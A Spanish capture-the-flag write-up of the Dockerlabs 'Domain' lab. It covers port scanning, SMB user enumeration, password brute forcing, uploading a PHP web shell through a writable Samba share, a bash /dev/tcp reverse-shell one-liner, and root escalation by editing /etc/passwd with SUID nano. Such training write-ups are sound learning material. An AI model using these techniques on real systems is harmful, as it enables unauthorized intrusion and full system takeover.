
Hola otra vez, vamos a resolver otra máquina de [Dockerlabs](https://dockerlabs.es/#/), en este caso la máquina se llama Domain y está incluida en la categoría media de Dockerlabs de [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg).

![alt text](images/image.png)

---------------------------------------------------------------------------------------------------------------------------------------------------

Sin más que añadir vamos a ello, como siempre empezaremos por descargar la máquina y realizar su instalación, recordad que funcionan mediante docker por lo que estaremos creando un contenedor en nuestra máquina local en el que se almacenará la máquina víctima.

![alt text](images/image-1.png)

Empezaremos realizando un ping a la máquina para verificar su correcto funcionamiento, al hacerlo vemos que tiene un TTL de 64, lo que significa que la máquina objetivo usa un sistema operativo Linux.

![alt text](images/image-2.png)

Como vemos, la máquina funciona correctamente y podemos empezar con el proceso de enumeración de la misma, vamos a ello.

# Enumeración

Lo primero que haremos para enumerar esta máquina será realizar un escaneo básico de puertos para identificar cuáles están abiertos.

```sudo nmap -p- --min-rate 5000 172.17.0.2 -Pn -n -oN escaneo```

![alt text](images/image-3.png)

Encontramos tres puertos abiertos, vamos a realizar un escaneo más exhaustivo para tratar de enumerar los servicios así como para lanzar ciertos scripts básicos de reconocimiento que nos otorguen más información acerca de los mismos.

``sudo nmap -p 80,139,445 --min-rate 5000 -sCV 172.17.0.2 -Pn -n -oN escaneoSC``

![alt text](images/image-4.png)

No vemos nada interesante, vamos a aanalizar el puerto 80 de este sistema.

![alt text](images/image-5.png)

Vemos una página que nos explica lo que es Samba, vamos a fuzzear para localizar directorios y archivos ocultos que no se vean a simple vista.

![alt text](images/image-6.png)

De momento sólo encontramos la página index.html, mientras esto se lanza vamos a enumerar el puerto 445 del sistema con enum4linux ya que nos puede proporcionar información acerca de usuarios.

![alt text](images/image-7.png)

![alt text](images/image-8.png)

¡Genial! Tenemos los nombres de dos de los usuarios disponibles, y vemos que no tenemos permisos para listar los contenidos de los shares sin disponer de credenciales válidas. 

# Explotación

Vamos a usar netexec o crackmapexec para lanzar un ataque de fuerza bruta y tratar de obtener de esta forma un inicio de sesión válido.

![alt text](images/image-9.png)

Con el usuario james no tenemos suerte pero con el usuario bob conseguimos dar con un inicio de sesión válido, vamos a usarlo para acceder al contenido de los shares.

![alt text](images/image-10.png)

Vemos que este usuario tiene permisos de escritura en el directorio html, ¿podría ser el directorio que contiene los archivos que encontramos en el puerto 80? Vamos a comprobarlo.

![alt text](images/image-11.png)

Parece que efectivamente esto es así ya que encontramos el único archivo que encontramos a raíz de nuestro fuzzeo, vamos a introducir un archivo ya que tenemos permisos de escritura y ver si podemos acceder al mismo desde el puerto 80.

![alt text](images/image-12.png)

![alt text](images/image-13.png)

![alt text](images/image-14.png)

Vamos a ver si podemos acceder al mismo.

![alt text](images/image-15.png)

¡Eso es! Podemos introducir archivos en el servidor web, por lo que podemos subir una reverse shell que nos otorgue una conexión en nuestra máquina atacante, vamos a hacerlo.

![alt text](images/image-16.png)

Con Wappalyzer vemos que el servidor interpreta el código PHP.

![alt text](images/image-17.png)

![alt text](images/image-18.png)

![alt text](images/image-19.png)

Muy bien, tenemos ejecución remota de código, vamos a enviar una reverse shell a nuestra máquina atacante.

![alt text](images/image-20.png)

![alt text](images/image-21.png)

Conseguimos nuestra reverse shell con el payload ``bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"`` aunque es importante que antes de usarlo lo urlencodeemos.

# Post-Explotación

Tenemos nuestro primer acceso y estamos listos para enumerar el sistema en busca de potenciales vías de escalada de privilegios. Lo primero que haremos será tratar de iniciar sesión con el usuario bob ya que tenemos unas credenciales válidas.

![alt text](images/image-22.png)

Efectivamente, somos el usuario bob, vamos a tratar de enumerar los permisos del mismo.

![alt text](images/image-23.png)

No tenemos el comando sudo instalado en la máquina, vamos a enumerar los binarios con el set SUID activado.

![alt text](images/image-24.png)

¿SUID en el binario nano? Esto significa que podríamos escribir sobre cualquier archivo, podríamos utilizar esto para modificar el archivo /etc/passwd para eliminar el requerimiento de contraseña del usuario root, vamos a intentarlo.

![alt text](images/image-25.png)

Parece que la máquina se rompió, suele pasar con nano, vamos a realizar un tratamiento de la tty completo.

![alt text](images/image-26.png)

Vamos a intentarlo ahora.

![alt text](images/image-27.png)

Estaba teniendo un problema al estabilizar la shell por rlwrap así que probé con netcat y pude estabilizarla correctamente. Una vez hecho esto tendremos que eliminar la x marcada para que no se nos pida contraseña al cambiar de usuario a root.

![alt text](images/image-28.png)

Con esto hecho no debería pedirnos contraseña al cambiar a root.

![alt text](images/image-29.png)

¡Genial! Tenemos una shell como el usuario root y hemos comprometido el sistema por completo pudiendo dar por concluida la máquina. Espero que os haya gustado mucho y nos vemos en la siguiente. :)


